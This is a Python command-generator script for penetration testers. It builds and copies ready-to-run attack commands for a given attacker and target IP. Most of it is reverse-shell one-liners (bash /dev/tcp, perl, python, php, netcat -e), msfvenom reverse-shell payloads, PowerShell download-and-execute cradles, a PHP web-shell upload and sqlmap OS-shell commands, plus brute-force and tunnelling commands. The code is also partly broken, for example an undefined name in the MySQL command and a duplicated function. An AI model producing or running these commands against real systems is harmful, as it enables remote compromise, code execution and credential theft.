#!/usr/bin/env python3.6
import argparse
import pyperclip

parser = argparse.ArgumentParser(description='Program created by eRaMvn. This program generates commands for pentesters to avoid mistakes during an engagement', 
    usage='%(prog)s source_ip [-lp your_local_port] target_ip [-d directory_to_store_file]')
parser.add_argument('source', metavar=" [source ip]", help="source ip address - usually attacker's ip address")
parser.add_argument('target', metavar=" [target ip]", help="target's ip address")
parser.add_argument('-lp', type=int, metavar="[port]", default=443, help='local port to listen to. Default port is 443')
parser.add_argument('-d', metavar="[directory]", default="~/Desktop", help='directory where files can be stored')
parser.add_argument('-v', action='version', version='%(prog)s version 1.0')

args = parser.parse_args()
source_ip = args.source
local_port = args.lp
target_ip = args.target
store_directory = args.d

"""
Eliminate the / at the end of directory
"""
if store_directory[-1] == "/":
    store_directory = store_directory[:-1]

"""
Add the option to ask for the change of ip, ports, maybe parse nmap file
If select 1, copy to clip board
"""
def tools(listoftools):
    for tool in sorted(listoftools):
        print(tool, end=' / ')
    print('\n')
    print("-----------------------------")

def copy_to_clipboard(options):
    # Print out all of the commands
    for key in options:
        print(str(key) + ". " + options[key])
        print("-----------------------------")

    print('Please choose commmand number to copy to clipboard. Type "0" to return to tool selection ')
    while True:
        try:
            choice = int(input("Input: ").strip())
        except:
            print(f"Please enter an integer from -1 to {len(options)}. 0 to return, -1 to list commands")
        else:
            if choice == 0:
                print("-----------------------------")
                print("Taking you back to tool selection!")
                print("-----------------------------")
                break
            elif choice == -1:
                for key in options:
                    print(str(key) + ". " + options[key])
                    print("-----------------------------")
            elif choice > len(options) or choice < -1:
                print(f"Please enter an integer from -1 to {len(options)}. 0 to return, -1 to list commands")
            else:
                #Copy command to clipboard
                pyperclip.copy(options[choice])
                print("Command has been copied to your clipboard!")
                print(f"Please enter an integer from -1 to {len(options)}. 0 to return, -1 to list commands")

def get_url():
    choice = input("Input: ").strip()
    return choice

def nmap():
    print("Please enter the port for nmap to scan. Leave blank to use default")
    ports = input("Input: ").strip()
    if ports == "":
        ports = "[edit port]"
    options = {1 : f"nmap -sSV -Pn -nvv -p- --reason -T4 -oN {store_directory}/{target_ip}_nmap_tcp_ports.txt {target_ip}",
        2: f"nmap -sSV -sC -Pn -nvv -p{ports} -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_nmap_detailed.txt {target_ip}",
        3: f"nmap -A -O --script vuln -p{ports} -oN {store_directory}/{target_ip}_nmap_vuln_scan.txt {target_ip}",
        4: f"nmap -Pn -p- -sU --stats-every 3m --max-retries 2 -T4 -oN {store_directory}/{target_ip}_nmap_udp_ports.txt {target_ip}",
        5: f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_nmap_firewalk.txt {target_ip}"
    }

    copy_to_clipboard(options)

def hydra():
    print("Please enter request from burp")
    request = get_url()

    print("Please enter user list location")
    user_list = input("Input: ").strip()

    print("Please enter password list location")
    pass_list = input("Input: ").strip()

    print("Please error message")
    error = input("Input: ").strip()

    options = {1 : f'hydra -L {user_list} -P {pass_list} 1{target_ip} http-post-form "{request}:{error}" -V -I',
    }

    copy_to_clipboard(options)

def gobuster():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    print("Please enter word list location (Default: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt). Leave blank to use default")
    word_list = input("Input: ").strip()
    if word_list == "":
        word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

    options = {1 : f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .php,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster.txt",
        2 : f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .asp,.aspx,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster.txt",
        3 : f"gobuster -u http://{url}:80/cgi-bin -w {word_list} -t 100 -x .pl,.sh -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster_cgi.txt",
    }

    copy_to_clipboard(options)

def nikto():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    options = {1 : f"nikto -h http://{url} | tee {store_directory}/{url}_nikto.txt",
    }
    
    copy_to_clipboard(options)

def unicorn():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    options = {1 : f"unicornscan -pa {url} | tee {store_directory}/{url}_unicorn_tcp.txt",
        2 : f"unicornscan -pa -mU {url} | tee {store_directory}/{url}_udp_ports.txt"
    }
    
    copy_to_clipboard(options)

def curl():
    print("Please enter the url. Leave blank to use default")
    url = get_url()
    if url == "":
        url = "http://192.168.25.55:11443/examples/test.jsp"
    
    options = {1 : f"curl -i -T /root/Desktop/test.jsp {url}",
        2 : f"""curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' {url}"""
    }
    
    copy_to_clipboard(options)

def rdesktop():
    user = input("Enter username: ").strip()
    password = input("Enter password: ").strip()
    options = {1 : f"rdesktop -u {user} -p {password} {target_ip} -f",
    }
    
    copy_to_clipboard(options)

def ssh():
    user = input("Enter username: ").strip()
    options = {1 : f"ssh {user}@{target_ip} -p 22",
        2 : f"ssh -ND 9050 {user}@{target_ip} -p 22",
        3 : f"ssh -i [key file] {user}@{target_ip}",
        4 : f"ssh -CNL 81:{source_ip}:80 {user}@{source_ip} -p 22",
        5 : f"ssh -CNR 81:localhost:80 {user}@{target_ip} -p 22"
    }
    
    copy_to_clipboard(options)

def nc():
    while True:
        try:
            target_port = int(input("Please enter the port listening on the target: ").strip())
        except:
            print("Enter an integer for a port")
        else:
            options = {1 : f"nc -nv {source_ip} {local_port} -e /bin/bash",
                2 : f"nc -nv {source_ip} {local_port} -e cmd.exe",
                3 : f"nc -nvlp {local_port}",
                4 : f"nc -lvp {target_port} -e cmd.exe",
                5 : f"nc -nv {target_ip} {target_port}",
                6 : f"nc -l -p 1234 > out.file",
                7 : f"nc -w 3 [destination] 1234 < out.file",
                8 : f"nc -l -p 1234 | uncompress -c | tar xvfp -",
                9 : f"tar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234",
            }
            break
    
    copy_to_clipboard(options)

def msfvenom():
    options = {1 : f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell",
        2 : f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell",
        3 : f'msfvenom -p windows/x86/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} EXITFUNC=thread -b "\x00\x0a" -f python -v payload > shell',
        4 : f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={source_ip} LPORT={local_port} -f asp > shell.asp",
        5 : f"msfvenom -p php/reverse_php LHOST={source_ip} LPORT={local_port} -f raw > shell1.phpD.png",
        6 : f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell.jsp",
        7 : f"msfvenom -p windows/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o plink_extra.exe",       
    }
    
    copy_to_clipboard(options)

def smbclient():
    options = {1 : f"smbclient -L {target_ip}",
        2 : f'smbclient "\\\\{target_ip}\<sharename>"',
        3 : f'smbclient -U <username> //{target_ip}/<sharename>',
        4 : f'smbclient //MOUNT/<sharename> -I {target_ip} -N',
    }
    
    copy_to_clipboard(options)

def cewl():
    print("Please enter the url. Leave blank to use default")
    url = get_url()

    options = {1 : f"cewl {url} -w {store_directory}/{target_ip}_cewl.txt",
    }
    
    copy_to_clipboard(options)

def wpscan():
    print("Please enter the url. Leave blank to use default")
    url = get_url()

    options = {1 : f"/usr/share/wpscan/wpscan.rb --url {url} --enumerate (vp,vt,u) --log wpscan-{target_ip}",
    }
    
    copy_to_clipboard(options)

def sshuttle():
    options = {1 : f"shuttle -r j0hn@10.11.1.252:22000 10.2.2.0/24",
    }
    
    copy_to_clipboard(options)

def sqlmap():
    print("Please enter the url. Leave blank to use default")
    url = get_url()
    if url == "":
        url = "http://10.11.12.108/comment.php?id=738"

    options = {1 : f"sqlmap -r request_file --level 5 --risk 3 --dbms=mysql --dump --batch",
        2 : f"sqlmap -u {url} --dbms=mysql --os-shell"
    }
    
    copy_to_clipboard(options)

def shell():
    options = {1 : f"bash -i >& /dev/tcp/{source_ip}/{local_port} 0>&1",
        2 : """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (source_ip, local_port),
        3 : f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{source_ip}",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
        4 : f"""php -r '$sock=fsockopen("{source_ip}",{local_port});exec("/bin/bash -i <&3 >&3 2>&3");'""",
        5 : f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {source_ip} {local_port} >/tmp/f",
        6 : f"xterm -display {source_ip}:1",
        7 : f"""python -c 'import pty; pty.spawn("/bin/bash")'"""
    }
    
    copy_to_clipboard(options)

def mysql():
    user = input("Enter username: ").strip()
    password = input("Enter password: ").strip()

    options = {1 : f"mysql -u{root} -{password} -h {target_ip}",
    }
    
    copy_to_clipboard(options)

def dig():
    options = {1 : f"dig axfr @{target_ip} [domain name]",
    }
    
    copy_to_clipboard(options)

def enum4linux():
    options = {1 : f"enum4linux -a {target_ip} | tee {store_directory}/{target_ip}_enum.txt",
    }
    
    copy_to_clipboard(options)

def smtp_user_enum():
    options = {1 : f"smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t {target_ip}",
    }
    
    copy_to_clipboard(options)

def smtp_user_enum():
    options = {1 : f"smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t {target_ip}",
    }
    
    copy_to_clipboard(options)

def mount():
    options = {1 : f"mount -t nfs {target_ip}:/home/vulnix /tmp/[folder]",
        2 : f"mount -t cifs -o username=[user] //{target_ip}/[sharename] /tmp/[folder]"
    }
    
    copy_to_clipboard(options)

def plink():
    options = {1 : f"plink.exe -l root -pw aBc123% -R 9090:127.0.0.1:9090 10.11.0.156 -P 80",
    }
    
    copy_to_clipboard(options)

def tcpdump():
    options = {1 : f"tcpdump -nnvvs -i any port 110 -w test.pcap",
        2 : f"tcpdump -nnvvvs 1024 -i any -A -w file251-235.pcap",
        3 : f"tcpdump -ni any icmp[icmptype]=icmp-echo",
        4 : f"tcpdump -i tun0 'src host [ip] and tcp[tcpflags]==tcp-syn'"
    }
    
    copy_to_clipboard(options)

def change(source, target, port):
    source_ip = source
    target_ip = target
    local_port = port
    while True:
        print('Please type "source" to change source ip, "target" to change target ip, "port" to change port, "back" to go back')
        choice = input('Input: ').strip()
        if choice == "source":
            source_ip = input("Please enter the new source ip: ").strip()
            print("Source IP changed!")
        elif choice == "target": 
            target_ip = input("Please enter the new target ip: ").strip()
            print("Target IP changed!")
        elif choice == "port":
            local_port = int(input("Please enter the source port: ").strip())
            print("Source port changed!")
        elif choice == "back":
            return (source_ip, target_ip, local_port)
        else:
            continue

def powershell():
    options = {1 : f"powershell IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/file.ps1')",
        2 : f"powershell -version 2 IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/file.ps1')",
        3 : f"IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/file.ps1')",
        4 : f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1",
    }
    
    copy_to_clipboard(options)
# map the inputs to the function blocks
options = {"nmap" : nmap,
           "hydra" : hydra,
           "gobuster" : gobuster,
           "nikto" : nikto,
           "unicorn" : unicorn,
           "curl" : curl,
           "rdesktop" : rdesktop,
           "ssh" : ssh,
           "nc" : nc,
           "msfvenom" : msfvenom,
           "smbclient" : smbclient,
           "cewl" : cewl,
           "wpscan": wpscan,
           "sshuttle": sshuttle,
           "sqlmap": sqlmap,
           "shell" : shell,
           "mysql" : mysql,
           "dig" : dig,
           "enum4linux": enum4linux,
           "smtp-user-enum": smtp_user_enum,
           "mount": mount,
           "plink": plink,
           "tcpdump": tcpdump,
           "powershell": powershell
}
while True:
    print("You are currently in tool selection mode.")
    print('Please choose commmand to generate. Otherwise, type "list" to list tools supported, "change" to change ips and ports, "exit" to quit program.')
    choice = input("Input: ").strip()
    
    if choice == "list":
        print("-----------------------------")
        print("This program currently supports the following tools:")
        tools(options)
    elif choice == "change":
        source_ip, target_ip, local_port = change(source_ip, target_ip, local_port)
    elif choice == "exit":
        print("Bye!")
        break
    elif choice not in options:
        print(f"This tool {choice} is not supported yet!")
        print("This program currently supports the following tools:")
        print("-----------------------------")
        tools(options)
    else:
        options[choice]()
